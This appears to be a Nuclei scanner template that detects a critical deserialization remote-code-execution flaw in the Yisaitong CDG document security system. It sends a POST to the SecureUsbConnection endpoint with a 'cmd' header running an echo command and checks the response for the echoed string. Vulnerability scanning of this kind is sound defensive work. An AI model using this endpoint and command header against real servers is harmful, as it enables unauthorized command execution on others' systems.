id: yisaitong-CDG-SecureUsbConnection-deserialization-rce

info:
  name: 亿赛通电子文档安全管理系统SecureUsbConnection存在反序列化漏洞
  author: yisaitong
  severity: critical
  tags: yisaitong

http:
  - raw:
      - |
        POST /CDGServer3/SecureUsbConnection?command=GETSYSTEMINFO HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate, br
        Content-Type: text/xml
        cmd: echo {{randstr}}
      
        

    max-redirects: 3
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '{{randstr}}'
      - type: dsl
        dsl:
          - 'len(body) < 35'
    matchers-condition: and
  